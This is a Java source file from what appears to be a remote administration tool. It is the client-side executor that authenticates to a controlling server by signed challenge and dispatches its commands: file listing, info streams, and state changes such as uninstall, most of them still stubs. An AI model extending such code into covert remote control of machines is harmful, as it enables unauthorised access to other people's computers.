/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.client.net;

import java.util.concurrent.TimeUnit;

import org.slf4j.Logger;

import com.subterranean_security.crimson.client.Client;
import com.subterranean_security.crimson.client.stream.CInfoSlave;
import com.subterranean_security.crimson.core.Common;
import com.subterranean_security.crimson.core.net.BasicExecutor;
import com.subterranean_security.crimson.core.net.ConnectionState;
import com.subterranean_security.crimson.core.proto.ClientAuth.Group;
import com.subterranean_security.crimson.core.proto.ClientAuth.MI_GroupChallengeResult;
import com.subterranean_security.crimson.core.proto.ClientAuth.RQ_GroupChallenge;
import com.subterranean_security.crimson.core.proto.ClientAuth.RS_GroupChallenge;
import com.subterranean_security.crimson.core.proto.FileManager.RS_FileListing;
import com.subterranean_security.crimson.core.proto.MSG.Message;
import com.subterranean_security.crimson.core.proto.Stream.Param;
import com.subterranean_security.crimson.core.stream.StreamStore;
import com.subterranean_security.crimson.core.util.CUtil;
import com.subterranean_security.crimson.core.util.Crypto;
import com.subterranean_security.crimson.core.util.IDGen;

import io.netty.util.ReferenceCountUtil;

public class ClientExecutor extends BasicExecutor {
	private static final Logger log = CUtil.Logging.getLogger(ClientExecutor.class);

	private ClientConnector connector;

	public ClientExecutor(ClientConnector vc) {
		connector = vc;

		ubt = new Thread(new Runnable() {
			public void run() {
				while (!Thread.currentThread().isInterrupted()) {
					Message m;
					try {
						m = connector.uq.take();
					} catch (InterruptedException e) {
						return;
					}

					ReferenceCountUtil.release(m);
				}
			}
		});
		ubt.start();

		nbt = new Thread(new Runnable() {
			public void run() {
				while (!Thread.currentThread().isInterrupted()) {
					Message m;
					try {
						m = connector.nq.take();
					} catch (InterruptedException e) {
						return;
					}
					if (m.hasRqGroupChallenge()) {
						challenge_rq(m);
					} else if (m.hasMiChallengeresult()) {
						challengeResult_1w(m);
					} else if (m.hasRqFileListing()) {
						file_listing_rq(m);
					} else if (m.hasMiAssignCvid()) {
						assign_1w(m);
					} else if (m.hasMiStreamStart()) {
						stream_start_ev(m);
					} else if (m.hasMiStreamStop()) {
						stream_stop_ev(m);
					} else if (m.hasRqChangeClientState()) {
						rq_change_client_state(m);
					} else {
						connector.cq.put(m.getId(), m);
					}

					ReferenceCountUtil.release(m);

				}
			}
		});
		nbt.start();
	}

	private void rq_change_client_state(Message m) {
		// TODO reply
		log.debug("Received state change request: {}", m.getRqChangeClientState().getNewState().toString());
		switch (m.getRqChangeClientState().getNewState()) {
		case FUNCTIONING_OFF:
			break;
		case FUNCTIONING_ON:
			break;
		case RESTART:
			break;
		case SHUTDOWN:
			break;
		case UNINSTALL:
			break;

		}

	}

	private void challenge_rq(Message m) {
		if (connector.getState() != ConnectionState.AUTH_STAGE1) {
			return;
		}

		Group group = null;
		try {
			group = (Group) Client.clientDB.getObject("auth.group");
		} catch (Exception e1) {
			e1.printStackTrace();
			log.debug("Unable to get group information");
			return;
		}
		String result = Crypto.sign(m.getRqGroupChallenge().getMagic(), group.getKey());
		RS_GroupChallenge rs = RS_GroupChallenge.newBuilder().setResult(result).build();
		connector.handle.write(Message.newBuilder().setId(m.getId()).setRsGroupChallenge(rs).build());
	}

	private void challengeResult_1w(Message m) {
		if (connector.getState() != ConnectionState.AUTH_STAGE1) {
			return;
		}
		if (!m.getMiChallengeresult().getResult()) {
			log.debug("Authentication with server failed");
			connector.setState(ConnectionState.CONNECTED);
			return;
		} else {
			connector.setState(ConnectionState.AUTH_STAGE2);
		}

		Group group = null;
		try {
			group = (Group) Client.clientDB.getObject("auth.group");
		} catch (Exception e1) {
			e1.printStackTrace();
			log.debug("Unable to get group information");
			return;
		}
		final String key = group.getKey();

		// Send authentication challenge
		final int id = IDGen.get();

		final String magic = CUtil.Misc.randString(64);
		RQ_GroupChallenge rq = RQ_GroupChallenge.newBuilder().setGroupName(group.getName()).setMagic(magic).build();
		connector.handle.write(Message.newBuilder().setId(id).setRqGroupChallenge(rq).build());

		new Thread(new Runnable() {
			public void run() {
				boolean flag = true;
				try {
					Message rs = connector.cq.take(id, 7, TimeUnit.SECONDS);
					if (rs != null) {
						if (!rs.getRsGroupChallenge().getResult().equals(Crypto.sign(magic, key))) {
							log.info("Server challenge failed");
							flag = false;
						}

					} else {
						log.debug("No response to challenge");
						flag = false;
					}
				} catch (InterruptedException e) {
					log.debug("No response to challenge");
					flag = false;
				}

				MI_GroupChallengeResult.Builder oneway = MI_GroupChallengeResult.newBuilder().setResult(flag);
				if (flag) {
					connector.setState(ConnectionState.AUTHENTICATED);
				} else {
					connector.setState(ConnectionState.CONNECTED);
				}
				connector.handle.write(Message.newBuilder().setId(id).setMiChallengeresult(oneway.build()).build());
			}
		}).start();

	}

	private void file_listing_rq(Message m) {

		Client.connector.handle.write(Message.newBuilder()
				.setRsFileListing(RS_FileListing.newBuilder().addAllListing(null)).setVid(m.getVid()).build());
	}

	private void assign_1w(Message m) {
		Common.cvid = m.getMiAssignCvid().getId();
		Client.clientDB.storeObject("cvid", Common.cvid);
	}

	private void stream_start_ev(Message m) {
		log.debug("stream_start_ev");
		Param p = m.getMiStreamStart().getParam();
		if (p.hasInfoParam()) {
			StreamStore.addStream(new CInfoSlave(p));
		}
	}

	private void stream_stop_ev(Message m) {
		log.debug("stream_stop_ev");
		StreamStore.removeStream(m.getMiStreamStop().getStreamID());

	}

}
